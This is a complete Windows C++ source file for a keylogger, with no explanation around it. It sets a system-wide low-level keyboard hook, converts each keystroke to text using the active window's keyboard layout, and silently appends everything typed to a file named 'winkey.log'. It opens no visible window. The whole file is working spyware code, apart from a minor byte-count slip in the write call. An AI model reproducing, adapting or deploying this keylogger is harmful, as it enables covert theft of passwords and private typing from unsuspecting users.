#pragma warning(disable:4530 4668 4577)

#include <windows.h>

#pragma comment(lib, "user32.lib")

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT* kbd_struct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
	HANDLE hFile;
	DWORD dwPtr, dwPID, dwThreadID;

	switch (wParam) {
	case WM_KEYDOWN:
		HWND hForegoundProcess = GetForegroundWindow();
		dwThreadID = GetWindowThreadProcessId(hForegoundProcess, &dwPID);
		HKL currentLocale = GetKeyboardLayout(dwThreadID);
		WCHAR buffer[32];

		BYTE uKeyboardState[256] = { 0 };
		GetKeyState(VK_SHIFT);
		GetKeyState(VK_MENU);
		GetKeyboardState(uKeyboardState);
		int numChars = ToUnicodeEx(kbd_struct->vkCode, kbd_struct->scanCode, uKeyboardState, buffer, 32, 0, currentLocale);
		if (numChars < 1)
			break;
		hFile = CreateFile(
			TEXT("winkey.log"),
			FILE_APPEND_DATA,
			FILE_SHARE_READ,
			NULL,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (hFile != INVALID_HANDLE_VALUE) {
			SetFilePointer(hFile, 0, NULL, FILE_END);

			WriteFile(
				hFile,
				buffer,
				(DWORD)numChars,
				&dwPtr,
				NULL);

			CloseHandle(hFile);
			hFile = INVALID_HANDLE_VALUE;
		}
		break;
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nShowCmd)
{
	(void)hInstance;
	(void)hPrevInstance;
	(void)lpCmdLine;
	(void)nShowCmd;

	HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHook, 0, 0);

	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) > 0) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(kbd);

	return 0;
}